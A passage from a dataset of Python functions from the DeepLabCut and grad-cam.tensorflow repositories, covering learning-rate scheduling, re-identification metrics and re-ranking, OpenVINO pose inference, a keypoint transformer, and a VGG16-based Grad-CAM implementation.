            apply_noise = t >= self.noise_range_t
        if apply_noise:
            g = torch.Generator()
            g.manual_seed(self.noise_seed + t)
            if self.noise_type == 'normal':
                while True:
                    noise = torch.randn(1, generator=g).item()
                    if abs(noise) < self.noise_pct:
                        break
            else:
                noise = 2 * (torch.rand(1, generator=g).item() - 0.5) * self.noise_pct
            lrs = [v + v * noise for v in lrs]
    return lrs"
AlexEMG/DeepLabCut,create_scheduler,"def create_scheduler(cfg, optimizer, num_epochs=200):
    num_epochs = num_epochs
    lr_min = 0.002 * cfg['base_lr']
    warmup_lr_init = 0.01 * cfg['base_lr']
    warmup_t = cfg['warmup_epochs']
    noise_range = None
    lr_scheduler = CosineLRScheduler(optimizer, t_initial=num_epochs, lr_min=lr_min, t_mul=1.0, decay_rate=0.1, warmup_lr_init=warmup_lr_init, warmup_t=warmup_t, cycle_limit=1, t_in_epochs=True, noise_range_t=noise_range, noise_pct=0.67, noise_std=1.0, noise_seed=42)
    return lr_scheduler"
AlexEMG/DeepLabCut,__init__,"def __init__(self):
    self.val = 0
    self.avg = 0
    self.sum = 0
    self.count = 0"
AlexEMG/DeepLabCut,reset,"def reset(self):
    self.val = 0
    self.avg = 0
    self.sum = 0
    self.count = 0"
AlexEMG/DeepLabCut,update,"def update(self, val, n=1):
    self.val = val
    self.sum += val * n
    self.count += n
    self.avg = self.sum / self.count"
AlexEMG/DeepLabCut,euclidean_distance,"def euclidean_distance(qf, gf):
    m = qf.shape[0]
    n = gf.shape[0]
    dist_mat = torch.pow(qf, 2).sum(dim=1, keepdim=True).expand(m, n) + torch.pow(gf, 2).sum(dim=1, keepdim=True).expand(n, m).t()
    dist_mat.addmm_(1, -2, qf, gf.t())
    return dist_mat.cpu().numpy()"
AlexEMG/DeepLabCut,cosine_similarity,"def cosine_similarity(qf, gf):
    epsilon = 1e-05
    dist_mat = qf.mm(gf.t())
    qf_norm = torch.norm(qf, p=2, dim=1, keepdim=True)
    gf_norm = torch.norm(gf, p=2, dim=1, keepdim=True)
    qg_normdot = qf_norm.mm(gf_norm.t())
    dist_mat = dist_mat.mul(1 / qg_normdot).cpu().numpy()
    dist_mat = np.clip(dist_mat, -1 + epsilon, 1 - epsilon)
    dist_mat = np.arccos(dist_mat)
    return dist_mat"
AlexEMG/DeepLabCut,eval_func,"def eval_func(distmat, q_pids, g_pids, q_camids, g_camids, max_rank=50):
    """"""Evaluation with market1501 metric
    Key: for each query identity, its gallery images from the same camera view are discarded.
    """"""
    (num_q, num_g) = distmat.shape
    if num_g < max_rank:
        max_rank = num_g
        print('Note: number of gallery samples is quite small, got {}'.format(num_g))
    indices = np.argsort(distmat, axis=1)
    matches = (g_pids[indices] == q_pids[:, np.newaxis]).astype(np.int32)
    all_cmc = []
    all_AP = []
    num_valid_q = 0.0
    for q_idx in range(num_q):
        q_pid = q_pids[q_idx]
        q_camid = q_camids[q_idx]
        order = indices[q_idx]
        remove = (g_pids[order] == q_pid) & (g_camids[order] == q_camid)
        keep = np.invert(remove)
        orig_cmc = matches[q_idx][keep]
        if not np.any(orig_cmc):
            continue
        cmc = orig_cmc.cumsum()
        cmc[cmc > 1] = 1
        all_cmc.append(cmc[:max_rank])
        num_valid_q += 1.0
        num_rel = orig_cmc.sum()
        tmp_cmc = orig_cmc.cumsum()
        y = np.arange(1, tmp_cmc.shape[0] + 1) * 1.0
        tmp_cmc = tmp_cmc / y
        tmp_cmc = np.asarray(tmp_cmc) * orig_cmc
        AP = tmp_cmc.sum() / num_rel
        all_AP.append(AP)
    assert num_valid_q > 0, 'Error: all query identities do not appear in gallery'
    all_cmc = np.asarray(all_cmc).astype(np.float32)
    all_cmc = all_cmc.sum(0) / num_valid_q
    mAP = np.mean(all_AP)
    return (all_cmc, mAP)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, num_query, max_rank=50, feat_norm=True, reranking=False):
    super(R1_mAP_eval, self).__init__()
    self.num_query = num_query
    self.max_rank = max_rank
    self.feat_norm = feat_norm
    self.reranking = reranking"
AlexEMG/DeepLabCut,reset,"def reset(self):
    self.feats = []
    self.pids = []
    self.camids = []"
AlexEMG/DeepLabCut,update,"def update(self, output):
    (feat, pid, camid) = output
    self.feats.append(feat.cpu())
    self.pids.extend(np.asarray(pid))
    self.camids.extend(np.asarray(camid))"
AlexEMG/DeepLabCut,compute,"def compute(self):
    feats = torch.cat(self.feats, dim=0)
    if self.feat_norm:
        print('The test feature is normalized')
        feats = torch.nn.functional.normalize(feats, dim=1, p=2)
    qf = feats[:self.num_query]
    q_pids = np.asarray(self.pids[:self.num_query])
    q_camids = np.asarray(self.camids[:self.num_query])
    gf = feats[self.num_query:]
    g_pids = np.asarray(self.pids[self.num_query:])
    g_camids = np.asarray(self.camids[self.num_query:])
    if self.reranking:
        print('=> Enter reranking')
        distmat = re_ranking(qf, gf, k1=50, k2=15, lambda_value=0.3)
    else:
        print('=> Computing DistMat with euclidean_distance')
        distmat = euclidean_distance(qf, gf)
    (cmc, mAP) = eval_func(distmat, q_pids, g_pids, q_camids, g_camids)
    return (cmc, mAP, distmat, self.pids, self.camids, qf, gf)"
AlexEMG/DeepLabCut,load_features_from_coord,"def load_features_from_coord(feature, coords, valid_mask_for_fish=False):
    """"""extract the deep feature at the location of the keypoint (x,y)""""""
    if valid_mask_for_fish:
        mask = np.array([1, 2, 6])
        coords = coords[mask, :]
    feat_vec = np.zeros((coords.shape[0], coords.shape[1], feature.shape[-1]))
    for animal_idx in range(coords.shape[0]):
        for kpt_idx in range(coords.shape[1]):
            coord = coords[animal_idx][kpt_idx]
            (x, y) = coord
            vec = feature[y, x, :]
            if np.sum(coord) != 0:
                feat_vec[animal_idx][kpt_idx] = vec
    return feat_vec"
AlexEMG/DeepLabCut,convert_coord_from_img_space_to_feature_space,"def convert_coord_from_img_space_to_feature_space(arr, stride):
    """"""
    if stride ==8:
        stride = stride * 2
    elif stride == 4:
        stride = stride *4
    elif stride ==2:
        stride = stride *8
    """"""
    stride = 16
    arr = np.nan_to_num(arr).astype(np.int64)
    arr = (arr - stride // 2) // stride
    return arr.astype(np.int64)"
AlexEMG/DeepLabCut,query_feature_by_coord_in_img_space,"def query_feature_by_coord_in_img_space(feature_dict, frame_id, ref_coord):
    features = feature_dict[frame_id]['features']
    coordinates = feature_dict[frame_id]['coordinates']
    diff = coordinates - ref_coord
    diff[np.where(np.logical_or(diff > 9000, diff < 0))] = np.nan
    match_id = np.argmin(np.nanmean(diff, axis=(1, 2)))
    return features[match_id]"
AlexEMG/DeepLabCut,re_ranking,"def re_ranking(probFea, galFea, k1, k2, lambda_value, local_distmat=None, only_local=False):
    """"""

    probFea: all feature vectors of the query set (torch tensor)
    galFea: all feature vectors of the gallery set (torch tensor)
    k1,k2,lambda: parameters, the original paper uses (k1=20,k2=6,lambda=0.3)

    Code adapted from  https://github.com/zhunzhong07/person-re-ranking

    Zhong Z, Zheng L, Cao D, et al. Re-ranking Person Re-identification with k-reciprocal Encoding CVPR 2017.

    """"""
    query_num = probFea.size(0)
    all_num = query_num + galFea.size(0)
    if only_local:
        original_dist = local_distmat
    else:
        feat = torch.cat([probFea, galFea])
        distmat = torch.pow(feat, 2).sum(dim=1, keepdim=True).expand(all_num, all_num) + torch.pow(feat, 2).sum(dim=1, keepdim=True).expand(all_num, all_num).t()
        distmat.addmm_(1, -2, feat, feat.t())
        original_dist = distmat.cpu().numpy()
        del feat
        if not local_distmat is None:
            original_dist = original_dist + local_distmat
    gallery_num = original_dist.shape[0]
    original_dist = np.transpose(original_dist / np.max(original_dist, axis=0))
    V = np.zeros_like(original_dist).astype(np.float16)
    initial_rank = np.argsort(original_dist).astype(np.int32)
    for i in range(all_num):
        forward_k_neigh_index = initial_rank[i, :k1 + 1]
        backward_k_neigh_index = initial_rank[forward_k_neigh_index, :k1 + 1]
        fi = np.where(backward_k_neigh_index == i)[0]
        k_reciprocal_index = forward_k_neigh_index[fi]
        k_reciprocal_expansion_index = k_reciprocal_index
        for j in range(len(k_reciprocal_index)):
            candidate = k_reciprocal_index[j]
            candidate_forward_k_neigh_index = initial_rank[candidate, :int(np.around(k1 / 2)) + 1]
            candidate_backward_k_neigh_index = initial_rank[candidate_forward_k_neigh_index, :int(np.around(k1 / 2)) + 1]
            fi_candidate = np.where(candidate_backward_k_neigh_index == candidate)[0]
            candidate_k_reciprocal_index = candidate_forward_k_neigh_index[fi_candidate]
            if len(np.intersect1d(candidate_k_reciprocal_index, k_reciprocal_index)) > 2 / 3 * len(candidate_k_reciprocal_index):
                k_reciprocal_expansion_index = np.append(k_reciprocal_expansion_index, candidate_k_reciprocal_index)
        k_reciprocal_expansion_index = np.unique(k_reciprocal_expansion_index)
        weight = np.exp(-original_dist[i, k_reciprocal_expansion_index])
        V[i, k_reciprocal_expansion_index] = weight / np.sum(weight)
    original_dist = original_dist[:query_num,]
    if k2 != 1:
        V_qe = np.zeros_like(V, dtype=np.float16)
        for i in range(all_num):
            V_qe[i, :] = np.mean(V[initial_rank[i, :k2], :], axis=0)
        V = V_qe
        del V_qe
    del initial_rank
    invIndex = []
    for i in range(gallery_num):
        invIndex.append(np.where(V[:, i] != 0)[0])
    jaccard_dist = np.zeros_like(original_dist, dtype=np.float16)
    for i in range(query_num):
        temp_min = np.zeros(shape=[1, gallery_num], dtype=np.float16)
        indNonZero = np.where(V[i, :] != 0)[0]
        indImages = [invIndex[ind] for ind in indNonZero]
        for j in range(len(indNonZero)):
            temp_min[0, indImages[j]] = temp_min[0, indImages[j]] + np.minimum(V[i, indNonZero[j]], V[indImages[j], indNonZero[j]])
        jaccard_dist[i] = 1 - temp_min / (2 - temp_min)
    final_dist = jaccard_dist * (1 - lambda_value) + original_dist * lambda_value
    del original_dist
    del V
    del jaccard_dist
    final_dist = final_dist[:query_num, query_num:]
    return final_dist"
AlexEMG/DeepLabCut,GetPoseF_OV,"def GetPoseF_OV(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, batchsize):
    """"""Prediction of pose""""""
    PredictedData = np.zeros((nframes, 3 * len(dlc_cfg['all_joints_names'])))
    (ny, nx) = (int(cap.get(4)), int(cap.get(3)))
    if cfg['cropping']:
        (ny, nx) = checkcropping(cfg, cap)
    sess._init_model(ny, nx)
    pbar = tqdm(total=nframes)
    counter = 0
    step = max(10, int(nframes / 100))

    def completion_callback(request, inp_id):
        pose = next(iter(request.results.values()))
        pose[:, [0, 1, 2]] = pose[:, [1, 0, 2]]
        pose = np.reshape(pose, (1, -1))
        PredictedData[inp_id] = pose
    sess.infer_queue.set_callback(completion_callback)
    while cap.isOpened():
        if counter % step == 0:
            pbar.update(step)
        (ret, frame) = cap.read()
        if not ret:
            break
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        if cfg['cropping']:
            frame = frame[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']]
        sess.infer_queue.start_async({sess.input_name: np.expand_dims(frame, axis=0)}, counter)
        counter += 1
    sess.infer_queue.wait_all()
    pbar.close()
    return (PredictedData, nframes)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg, device):
    self.core = Core()
    self.xml_path = cfg['init_weights'] + '.xml'
    self.device = device
    if not os.path.exists(self.xml_path):
        subprocess.run(['mo', '--output_dir', os.path.dirname(cfg['init_weights']), '--input_model', cfg['init_weights'] + '.pb', '--input_shape', '[1, 747, 832, 3]', '--extensions', os.path.join(os.path.dirname(__file__), 'mo_extensions'), '--data_type', 'FP16'], check=True)
    self.net = self.core.read_model(self.xml_path)
    self.input_name = self.net.inputs[0].get_any_name()
    self.output_name = self.net.outputs[0].get_any_name()
    self.infer_queue = None"
AlexEMG/DeepLabCut,_init_model,"def _init_model(self, inp_h, inp_w):
    inp_shape = [1, inp_h, inp_w, 3]
    self.net.reshape({self.input_name: inp_shape})
    if 'CPU' in self.device:
        self.core.set_property('CPU', {'CPU_THROUGHPUT_STREAMS': 'CPU_THROUGHPUT_AUTO', 'CPU_BIND_THREAD': 'YES'})
    if 'GPU' in self.device:
        self.core.set_property('GPU', {'GPU_THROUGHPUT_STREAMS': 'GPU_THROUGHPUT_AUTO'})
    compiled_model = self.core.compile_model(self.net, self.device)
    num_requests = compiled_model.get_property('OPTIMAL_NUMBER_OF_INFER_REQUESTS')
    print(f'OpenVINO uses {num_requests} inference requests')
    self.infer_queue = AsyncInferQueue(compiled_model, num_requests)"
AlexEMG/DeepLabCut,run,"def run(self, out_name, feed_dict):
    (inp_name, inp) = next(iter(feed_dict.items()))
    if self.infer_queue is None:
        self._init_model(inp.shape[1], inp.shape[2])
    batch_size = inp.shape[0]
    batch_output = np.zeros([batch_size] + self.net.outputs[out_name].shape, dtype=np.float32)

    def completion_callback(request, inp_id):
        output = next(iter(request.results.values()))
        batch_output[out_id] = output
    self.infer_queue.set_callback(completion_callback)
    for inp_id in range(batch_size):
        self.infer_queue.start_async({inp_name: inp[inp_id:inp_id + 1]}, inp_id)
    self.infer_queue.wait_all()
    return batch_output.reshape(-1, 3)"
AlexEMG/DeepLabCut,completion_callback,"def completion_callback(request, inp_id):
    pose = next(iter(request.results.values()))
    pose[:, [0, 1, 2]] = pose[:, [1, 0, 2]]
    pose = np.reshape(pose, (1, -1))
    PredictedData[inp_id] = pose"
AlexEMG/DeepLabCut,completion_callback,"def completion_callback(request, inp_id):
    output = next(iter(request.results.values()))
    batch_output[out_id] = output"
AlexEMG/DeepLabCut,drop_path,"def drop_path(x, drop_prob: float=0.0, training: bool=False):
    """"""Drop paths (Stochastic Depth) per sample (when applied in main path of residual blocks).

    This is the same as the DropConnect impl I created for EfficientNet, etc networks, however,
    the original name is misleading as 'Drop Connect' is a different form of dropout in a separate paper...
    See discussion: https://github.com/tensorflow/tpu/issues/494#issuecomment-532968956 ... I've opted for
    changing the layer and argument names to 'drop path' rather than mix DropConnect as a layer name and use
    'survival rate' as the argument.

    """"""
    if drop_prob == 0.0 or not training:
        return x
    keep_prob = 1 - drop_prob
    shape = (x.shape[0],) + (1,) * (x.ndim - 1)
    random_tensor = keep_prob + torch.rand(shape, dtype=x.dtype, device=x.device)
    random_tensor.floor_()
    output = x.div(keep_prob) * random_tensor
    return output"
AlexEMG/DeepLabCut,resize_pos_embed,"def resize_pos_embed(posemb, posemb_new, height, width):
    ntok_new = posemb_new.shape[1]
    (posemb_token, posemb_grid) = (posemb[:, :1], posemb[0, 1:])
    ntok_new -= 1
    gs_old = int(math.sqrt(len(posemb_grid)))
    print('Resized position embedding from size:{} to size: {} with height:{} width: {}'.format(posemb.shape, posemb_new.shape, height, width))
    posemb_grid = posemb_grid.reshape(1, gs_old, gs_old, -1).permute(0, 3, 1, 2)
    posemb_grid = F.interpolate(posemb_grid, size=(height, width), mode='bilinear')
    posemb_grid = posemb_grid.permute(0, 2, 3, 1).reshape(1, height * width, -1)
    posemb = torch.cat([posemb_token, posemb_grid], dim=1)
    return posemb"
AlexEMG/DeepLabCut,dlc_base_kpt_TransReID,"def dlc_base_kpt_TransReID(in_chans=2048, drop_rate=0.0, attn_drop_rate=0.0, drop_path_rate=0.1, local_feature=False, sie_xishu=1.5, kpt_num=12, **kwargs):
    embed_dim = 128
    depth = 4
    num_heads = 4
    mlp_ratio = 1
    num_kpts = kpt_num
    model = DLCTransReID(in_chans=in_chans, embed_dim=embed_dim, depth=depth, num_heads=num_heads, mlp_ratio=mlp_ratio, qkv_bias=True, drop_path_rate=drop_path_rate, drop_rate=drop_rate, attn_drop_rate=attn_drop_rate, num_kpts=num_kpts, norm_layer=partial(nn.LayerNorm, eps=1e-06), sie_xishu=sie_xishu, local_feature=local_feature, **kwargs)
    return model"
AlexEMG/DeepLabCut,_no_grad_trunc_normal_,"def _no_grad_trunc_normal_(tensor, mean, std, a, b):

    def norm_cdf(x):
        return (1.0 + math.erf(x / math.sqrt(2.0))) / 2.0
    if mean < a - 2 * std or mean > b + 2 * std:
        print('mean is more than 2 std from [a, b] in nn.init.trunc_normal_. The distribution of values may be incorrect.')
    with torch.no_grad():
        l = norm_cdf((a - mean) / std)
        u = norm_cdf((b - mean) / std)
        tensor.uniform_(2 * l - 1, 2 * u - 1)
        tensor.erfinv_()
        tensor.mul_(std * math.sqrt(2.0))
        tensor.add_(mean)
        tensor.clamp_(min=a, max=b)
        return tensor"
AlexEMG/DeepLabCut,trunc_normal_,"def trunc_normal_(tensor, mean=0.0, std=1.0, a=-2.0, b=2.0):
    """"""Fills the input Tensor with values drawn from a truncated
    normal distribution. The values are effectively drawn from the
    normal distribution :math:`\\mathcal{N}(\\text{mean}, \\text{std}^2)`
    with values outside :math:`[a, b]` redrawn until they are within
    the bounds. The method used for generating the random values works
    best when :math:`a \\leq \\text{mean} \\leq b`.
    Args:
        tensor: an n-dimensional `torch.Tensor`
        mean: the mean of the normal distribution
        std: the standard deviation of the normal distribution
        a: the minimum cutoff value
        b: the maximum cutoff value
    Examples:
        >>> w = torch.empty(3, 5)
        >>> nn.init.trunc_normal_(w)
    """"""
    return _no_grad_trunc_normal_(tensor, mean, std, a, b)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, drop_prob=None):
    super(DropPath, self).__init__()
    self.drop_prob = drop_prob"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    return drop_path(x, self.drop_prob, self.training)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, in_features, hidden_features=None, out_features=None, act_layer=nn.GELU, drop=0.0):
    super().__init__()
    out_features = out_features or in_features
    hidden_features = hidden_features or in_features
    self.fc1 = nn.Linear(in_features, hidden_features)
    self.act = act_layer()
    self.fc2 = nn.Linear(hidden_features, out_features)
    self.drop = nn.Dropout(drop)"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    x = self.fc1(x)
    x = self.act(x)
    x = self.drop(x)
    x = self.fc2(x)
    x = self.drop(x)
    return x"
AlexEMG/DeepLabCut,__init__,"def __init__(self, dim, num_heads=8, qkv_bias=False, qk_scale=None, attn_drop=0.0, proj_drop=0.0):
    super().__init__()
    self.num_heads = num_heads
    head_dim = dim // num_heads
    self.scale = qk_scale or head_dim ** (-0.5)
    self.qkv = nn.Linear(dim, dim * 3, bias=qkv_bias)
    self.attn_drop = nn.Dropout(attn_drop)
    self.proj = nn.Linear(dim, dim)
    self.proj_drop = nn.Dropout(proj_drop)"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    (B, N, C) = x.shape
    qkv = self.qkv(x).reshape(B, N, 3, self.num_heads, C // self.num_heads).permute(2, 0, 3, 1, 4)
    (q, k, v) = (qkv[0], qkv[1], qkv[2])
    attn = q @ k.transpose(-2, -1) * self.scale
    attn = attn.softmax(dim=-1)
    attn = self.attn_drop(attn)
    x = (attn @ v).transpose(1, 2).reshape(B, N, C)
    x = self.proj(x)
    x = self.proj_drop(x)
    return x"
AlexEMG/DeepLabCut,__init__,"def __init__(self, dim, num_heads, mlp_ratio=4.0, qkv_bias=False, qk_scale=None, drop=0.0, attn_drop=0.0, drop_path=0.0, act_layer=nn.GELU, norm_layer=nn.LayerNorm):
    super().__init__()
    self.norm1 = norm_layer(dim)
    self.attn = Attention(dim, num_heads=num_heads, qkv_bias=qkv_bias, qk_scale=qk_scale, attn_drop=attn_drop, proj_drop=drop)
    self.drop_path = DropPath(drop_path) if drop_path > 0.0 else nn.Identity()
    self.norm2 = norm_layer(dim)
    mlp_hidden_dim = int(dim * mlp_ratio)
    self.mlp = Mlp(in_features=dim, hidden_features=mlp_hidden_dim, act_layer=act_layer, drop=drop)"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    x = x + self.drop_path(self.attn(self.norm1(x)))
    x = x + self.drop_path(self.mlp(self.norm2(x)))
    return x"
AlexEMG/DeepLabCut,__init__,"def __init__(self, channel_size=2048, embed_dim=768):
    super().__init__()
    self.proj = nn.Linear(channel_size, embed_dim, 1)"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    (B, kpt_num, channel_size) = x.shape
    x = self.proj(x)
    return x"
AlexEMG/DeepLabCut,__init__,"def __init__(self, in_chans=2048, num_kpts=12, embed_dim=768, depth=4, num_heads=4, mlp_ratio=4.0, qkv_bias=False, qk_scale=None, drop_rate=0.0, attn_drop_rate=0.0, camera=0, view=0, drop_path_rate=0.0, hybrid_backbone=None, norm_layer=nn.LayerNorm, local_feature=False, sie_xishu=1.0, **kwargs):
    super().__init__()
    self.num_features = embed_dim
    self.local_feature = local_feature
    self.kpt_embed = KptEmbed(channel_size=in_chans, embed_dim=embed_dim)
    self.pos_embed = nn.Parameter(torch.zeros(1, num_kpts, embed_dim))
    self.kpt_num = num_kpts
    self.sie_xishu = sie_xishu
    self.pos_drop = nn.Dropout(p=drop_rate)
    dpr = [x.item() for x in torch.linspace(0, drop_path_rate, depth)]
    self.blocks = nn.ModuleList([Block(dim=embed_dim, num_heads=num_heads, mlp_ratio=mlp_ratio, qkv_bias=qkv_bias, qk_scale=qk_scale, drop=drop_rate, attn_drop=attn_drop_rate, drop_path=dpr[i], norm_layer=norm_layer) for i in range(depth)])
    self.norm = norm_layer(embed_dim)
    trunc_normal_(self.pos_embed, std=0.02)
    self.apply(self._init_weights)"
AlexEMG/DeepLabCut,_init_weights,"def _init_weights(self, m):
    if isinstance(m, nn.Linear):
        trunc_normal_(m.weight, std=0.02)
        if isinstance(m, nn.Linear) and m.bias is not None:
            nn.init.constant_(m.bias, 0)
    elif isinstance(m, nn.LayerNorm):
        nn.init.constant_(m.bias, 0)
        nn.init.constant_(m.weight, 1.0)"
AlexEMG/DeepLabCut,no_weight_decay,"@torch.jit.ignore
def no_weight_decay(self):
    return {'pos_embed', 'cls_token'}"
AlexEMG/DeepLabCut,get_classifier,"def get_classifier(self):
    return self.head"
AlexEMG/DeepLabCut,reset_classifier,"def reset_classifier(self, num_classes, global_pool=''):
    self.num_classes = num_classes
    self.fc = nn.Linear(self.embed_dim, num_classes) if num_classes > 0 else nn.Identity()"
AlexEMG/DeepLabCut,forward_features,"def forward_features(self, x):
    B = x.shape[0]
    x = self.kpt_embed(x)
    x = x + self.pos_embed
    x = self.pos_drop(x)
    if self.local_feature:
        for blk in self.blocks[:-1]:
            x = blk(x)
        return x
    else:
        for blk in self.blocks:
            x = blk(x)
        x = self.norm(x)
        return x[:, 0]"
AlexEMG/DeepLabCut,forward,"def forward(self, x):
    x = self.forward_features(x)
    return x"
AlexEMG/DeepLabCut,load_param,"def load_param(self, model_path):
    param_dict = torch.load(model_path, map_location='cpu')
    if 'model' in param_dict:
        param_dict = param_dict['model']
    if 'state_dict' in param_dict:
        param_dict = param_dict['state_dict']
    for (k, v) in param_dict.items():
        if 'head' in k or 'dist' in k:
            continue
        if 'patch_embed.proj.weight' in k and len(v.shape) < 4:
            (O, I, H, W) = self.patch_embed.proj.weight.shape
            v = v.reshape(O, -1, H, W)
        elif k == 'pos_embed' and v.shape != self.pos_embed.shape:
            if 'distilled' in model_path:
                print('distill need to choose right cls token in the pth')
                v = torch.cat([v[:, 0:1], v[:, 2:]], dim=1)
            v = resize_pos_embed(v, self.pos_embed, self.patch_embed.num_y, self.patch_embed.num_x)
        try:
            self.state_dict()[k].copy_(v)
        except:
            print('===========================ERROR=========================')
            print('shape do not match in k :{}: param_dict{} vs self.state_dict(){}'.format(k, v.shape, self.state_dict()[k].shape))"
AlexEMG/DeepLabCut,norm_cdf,"def norm_cdf(x):
    return (1.0 + math.erf(x / math.sqrt(2.0))) / 2.0"
AlexEMG/DeepLabCut,replace_op,"def replace_op(self, graph: Graph, node: Node):
    inp0 = node.in_port(0).get_source().node
    inp1 = node.in_port(1).get_source().node
    begin_id = Const(graph, {'value': int64_array([1])}).create_node()
    end_id = Const(graph, {'value': int64_array([2])}).create_node()
    dim1 = StridedSlice(graph, dict(name=inp0.name + '/dim1', begin_mask=[1], end_mask=[1], shrink_axis_mask=[0], new_axis_mask=[0], ellipsis_mask=[0])).create_node([inp1, begin_id, end_id])
    rows = Div(graph, dict(name=node.name + '/rows')).create_node([inp0, dim1])
    inp0 = Cast(graph, dict(name=inp0.name + '/fp32', dst_type=np.float32)).create_node([inp0])
    dim1 = Cast(graph, dict(name=dim1.name + '/fp32', dst_type=np.float32)).create_node([dim1])
    cols = FloorMod(graph, dict(name=node.name + '/cols')).create_node([inp0, dim1])
    cols = Cast(graph, dict(name=cols.name + '/i64', dst_type=np.int64)).create_node([cols])
    concat = PackOp(graph, dict(name=node.name + '/merged', axis=0)).create_node([rows, cols])
    return [concat.id]"
Ankush96/grad-cam.tensorflow,load_image,"def load_image(img_path):
    print('Loading image')
    img = imread(img_path, mode='RGB')
    img = imresize(img, (224, 224))
    x = np.expand_dims(img, axis=0)
    x = x[:, :, :, ::-1]
    return (x, img)"
Ankush96/grad-cam.tensorflow,grad_cam,"def grad_cam(x, vgg, sess, predicted_class, layer_name, nb_classes):
    print('Setting gradients to 1 for target class and rest to 0')
    conv_layer = vgg.layers[layer_name]
    one_hot = tf.sparse_to_dense(predicted_class, [nb_classes], 1.0)
    signal = tf.mul(vgg.layers['fc3'], one_hot)
    loss = tf.reduce_mean(signal)
    grads = tf.gradients(loss, conv_layer)[0]
    norm_grads = tf.div(grads, tf.sqrt(tf.reduce_mean(tf.square(grads))) + tf.constant(1e-05))
    (output, grads_val) = sess.run([conv_layer, norm_grads], feed_dict={vgg.imgs: x})
    output = output[0]
    grads_val = grads_val[0]
    weights = np.mean(grads_val, axis=(0, 1))
    cam = np.ones(output.shape[0:2], dtype=np.float32)
    for (i, w) in enumerate(weights):
        cam += w * output[:, :, i]
    cam = np.maximum(cam, 0)
    cam = cam / np.max(cam)
    cam = resize(cam, (224, 224))
    cam3 = np.expand_dims(cam, axis=2)
    cam3 = np.tile(cam3, [1, 1, 3])
    return cam3"
Ankush96/grad-cam.tensorflow,main,"def main(_):
    (x, img) = load_image(FLAGS.input)
    sess = tf.Session()
    print('\nLoading Vgg')
    imgs = tf.placeholder(tf.float32, [None, 224, 224, 3])
    vgg = vgg16(imgs, 'vgg16_weights.npz', sess)
    print('\nFeedforwarding')
    prob = sess.run(vgg.probs, feed_dict={vgg.imgs: x})[0]
    preds = np.argsort(prob)[::-1][0:5]
    print('\nTop 5 classes are')
    for p in preds:
        print(class_names[p], prob[p])
    predicted_class = preds[0]
    layer_name = FLAGS.layer_name
    nb_classes = 1000
    cam3 = grad_cam(x, vgg, sess, predicted_class, layer_name, nb_classes)
    img = img.astype(float)
    img /= img.max()
    new_img = img + 3 * cam3
    new_img /= new_img.max()
    io.imshow(new_img)
    plt.show()
    io.imsave(FLAGS.output, new_img)"
Ankush96/grad-cam.tensorflow,__init__,"def __init__(self, imgs, weights=None, sess=None):
    self.imgs = imgs
    self.convlayers()
    self.fc_layers()
    self.probs = tf.nn.softmax(self.fc3l)
    if weights is not None and sess is not None:
        self.load_weights(weights, sess)"
Ankush96/grad-cam.tensorflow,convlayers,"def convlayers(self):
    self.parameters = []
    self.layers = {}
    with tf.name_scope('preprocess') as scope:
        mean = tf.constant([103.939, 116.779, 123.68], dtype=tf.float32, shape=[1, 1, 1, 3], name='img_mean')
        images = self.imgs - mean
    with tf.name_scope('conv1_1') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 3, 64], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(images, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[64], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv1_1 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv1_1
        self.parameters += [kernel, biases]
    with tf.name_scope('conv1_2') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 64, 64], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv1_1, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[64], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv1_2 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv1_2
        self.parameters += [kernel, biases]
    self.pool1 = tf.nn.max_pool(self.conv1_2, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME', name='pool1')
    self.layers['pool1'] = self.pool1
    with tf.name_scope('conv2_1') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 64, 128], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.pool1, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[128], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv2_1 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv2_1
        self.parameters += [kernel, biases]
    with tf.name_scope('conv2_2') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 128, 128], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv2_1, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[128], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv2_2 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv2_2
        self.parameters += [kernel, biases]
    self.pool2 = tf.nn.max_pool(self.conv2_2, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME', name='pool2')
    self.layers['pool2'] = self.pool2
    with tf.name_scope('conv3_1') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 128, 256], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.pool2, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[256], dtype=tf.float32), trainable=True, name='biases')
